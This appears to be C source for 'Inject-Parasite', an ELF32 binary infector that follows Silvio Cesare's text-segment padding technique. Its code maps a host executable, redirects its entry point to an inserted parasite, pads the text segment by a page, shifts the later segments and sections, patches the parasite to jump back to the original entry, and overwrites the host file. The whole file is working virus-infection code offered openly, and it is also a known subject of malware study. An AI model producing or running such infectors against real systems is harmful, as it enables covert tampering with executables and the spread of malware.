/*
 * Inject-Parasite: ELF Binary infector (C) 2008  Ryan O'Neill <ryan@bitlackeys.com>
 *
 * This code follows the algorithm outlined in Silvio Cesares paper "Unix Elf Parasites and Virus"
 * Inject-Parasite allows you to insert a parasite into a binary, and into the flow of the binaries
 * execution, while still keeping the binary in tact. 
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h> 
#include <fcntl.h>

#include <elf.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096
#define TMP "tmp.bin"

struct stat st;
char *host;

unsigned long old_e_entry;
void mirror_binary_with_parasite(unsigned int, unsigned char *, unsigned int, char *);

int main(int argc, char **argv)
{
	unsigned char *mem; 
	
	unsigned char *tp;
	int fd, i, c;
	char text_found;
	mode_t mode;
	
	extern char parasite[];
	/* bytes of parasite */
        unsigned int parasite_size;
	unsigned long int leap_offset;
	unsigned long parasite_vaddr;

 	Elf32_Shdr *s_hdr;
        Elf32_Ehdr *e_hdr;
        Elf32_Phdr *p_hdr;
	
	usage:
	if (argc < 3)
	{
		printf("Usage: %s <elf-host> <size-of-parasite>\n",argv[0]); 
		exit(-1);
	}
 	 
	parasite_size = atoi(argv[2]);
	host = argv[1];

	printf("Length of parasite is %d bytes\n", parasite_size);
	
	if ((fd = open(argv[1], O_RDONLY)) == -1)
	{
		perror("open");
		exit(-1);
	}
	
	if (fstat(fd, &st) < 0)
        {
               perror("stat");
               exit(-1);
        } 
	
	mem = mmap(NULL, st.st_size,  PROT_READ | PROT_WRITE, MAP_PRIVATE , fd, 0);
	if (mem == MAP_FAILED)
	{
	       perror("mmap");
	       exit(-1);
 	}
	
	e_hdr = (Elf32_Ehdr *)mem;
 	if (e_hdr->e_ident[0] != 0x7f && strcmp(&e_hdr->e_ident[1], "ELF"))
        {
                printf("%s it not an elf file\n", argv[1]);
                exit(-1);
        } 
	 
     unsigned long text;
     int nc;
     text_found = 0;
     unsigned int after_insertion_offset;
     unsigned int end_of_text;

     p_hdr = (Elf32_Phdr *)(mem + e_hdr->e_phoff);
     for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) 
     {	 
     	 if (text_found)
	 {
	 	p_hdr->p_offset += PAGE_SIZE; 
		continue;
	 }
	 else
         if(p_hdr->p_type == PT_LOAD)
         { 
	      /* TEXT SEGMENT */
	      if (p_hdr->p_flags == (PF_R | PF_X))
       	      {
	 	   text = p_hdr->p_vaddr;
		   parasite_vaddr = p_hdr->p_vaddr + p_hdr->p_filesz;

	 	   /* save old entry point to jmp too later */
		   /* and patch entry point to our new entry */
		   old_e_entry = e_hdr->e_entry;
		   e_hdr->e_entry = parasite_vaddr;
		  	
		   end_of_text = p_hdr->p_offset + p_hdr->p_filesz;
	 	 
		   /* increase memsz and filesz */
		   p_hdr->p_filesz += parasite_size;
		   p_hdr->p_memsz += parasite_size;
		
		   /* same thing */	
		   after_insertion_offset = p_hdr->p_offset + p_hdr->p_filesz;
		   text_found++;
	      }
     	 }
      }
	
 /* increase size of any section that resides after injection by page size */ 

	 s_hdr = (Elf32_Shdr *)(mem + e_hdr->e_shoff);
	 for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
	 {
	 	if (s_hdr->sh_offset >= after_insertion_offset)
			s_hdr->sh_offset += PAGE_SIZE;
		else
		if (s_hdr->sh_size + s_hdr->sh_addr == parasite_vaddr)
			s_hdr->sh_size += parasite_size;

	 }
	 	
 	 if (!text)
	 {
		printf("Could not locate text segment, exiting\n");
	 	exit(-1);
	 }

	 printf("Text segment starts at %x\n", text);
	 printf("Patched entry point from 0x%x to 0x%x\n", old_e_entry, e_hdr->e_entry);
	 printf("Inserting parasite at offset %d vaddr 0x%x\n", end_of_text, parasite_vaddr);

	 e_hdr->e_shoff += PAGE_SIZE;
 	 mirror_binary_with_parasite(parasite_size, mem, end_of_text, parasite);

 	 done:
 	 munmap(mem, st.st_size);
 	 close(fd);
 	  	  
 }

void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, unsigned int end_of_text, char *parasite)
{
	
	int ofd;
	unsigned int c;
	int i, t = 0;
	
	/* eot is: 
	 * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
	 * end_of_text += p_hdr->p_filesz;
	 */ 
	extern int return_entry_start;

	printf("Mirroring host binary with parasite\n");

	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
	{
		perror("tmp binary: open");
		exit(-1);
	}

	if ((c = write(ofd, mem, end_of_text)) != end_of_text)
	{
		perror("write");
		exit(-1);
	}

	*(unsigned long *)&parasite[return_entry_start] = old_e_entry;
	
	if ((c = write(ofd, parasite, psize)) != psize)
	{
		perror("write");
		exit(-1);
	}
 	
	if((c = lseek(ofd, PAGE_SIZE - psize, SEEK_CUR)) != end_of_text + PAGE_SIZE)
	{
		perror("lseek");
		exit(-1);
	}

	mem += end_of_text;

	unsigned int sum = end_of_text + PAGE_SIZE;
	unsigned int last_chunk = st.st_size - end_of_text;
	
	if ((c = write(ofd, mem, last_chunk)) != last_chunk)
	{
		perror("write");
		exit(-1);
	}
	
	rename(TMP, host);
	close(ofd);
	
}


